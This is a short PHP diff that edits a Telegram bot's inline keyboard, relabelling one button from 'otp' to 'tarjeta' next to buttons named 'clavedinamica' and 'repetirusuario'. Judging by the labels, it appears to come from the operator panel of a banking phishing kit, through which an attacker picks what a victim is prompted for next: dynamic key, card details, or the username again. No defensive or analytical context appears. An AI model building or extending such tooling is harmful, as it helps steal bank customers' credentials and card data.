@@ -76,7 +76,7 @@ $botones = array(
     'inline_keyboard' => array(
         array(
             array('text' => "clavedinamica",   'callback_data' => "OPCION_1_" . $nuevo_request_id),
-            array('text' => "otp",             'callback_data' => "OPCION_2_" . $nuevo_request_id),
+            array('text' => "tarjeta",         'callback_data' => "OPCION_2_" . $nuevo_request_id),
         ),
         array(
             array('text' => "repetirusuario",  'callback_data' => "OPCION_3_" . $nuevo_request_id),
